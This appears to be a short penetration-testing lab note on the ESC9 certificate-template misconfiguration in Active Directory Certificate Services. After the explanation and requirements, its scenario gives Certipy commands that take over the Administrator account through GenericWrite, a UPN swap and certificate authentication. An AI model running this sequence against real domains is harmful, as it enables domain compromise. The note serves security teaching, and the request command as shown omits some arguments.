# General Overview: 

The `CT_FLAG_NO_SECURITY_EXTENSION` (0x80000) value for the `msPKI-Enrollment-Flag`, known as ESC9, prevents the inclusion of the `szOID_NTDS_CA_SECURITY_EXT` security extension in certificates. This flag is particularly important when `StrongCertificateBindingEnforcement` is set to 1 (the default), as opposed to 2. Its significance increases in scenarios where weaker certificate mappings for Kerberos or Schannel could be exploited, such as in ESC10, since the absence of ESC9 would not affect the security requirements.

## Requirements: 
- StrongCertificateBindingEnforcement set to 1 (default) or 0
- Certificate contains the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value
- Certificate specifies Any Client authentication EKU
- GenericWrite over any account A to compromise any account B
# Abusing ESC9  Certificate Templates

## Scenario 1 

afsimmons@megacorpone.com has GenericWrite over xadmin@megacorpone.com, and we want to compromise Administrator@megacorpone.com. xadmin@megacorpone.com is allowed to enroll in the certificate template ESC9 that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value.
## Certipy

- certipy-ad shadow auto -username afsimmons@megacorpone.com -p Spawn123! -account xadmin
- certipy-ad account update -username afsimmons@megacorpone.com -p Spawn123! -user xadmin -upn Administrator
- certipy-ad req -username afsimmons@megacorpone.com -password Spawn123! -user xadmin@megacorpone.com
- certipy-ad auth -pfx administrator.pfx -domain megacorpone.com
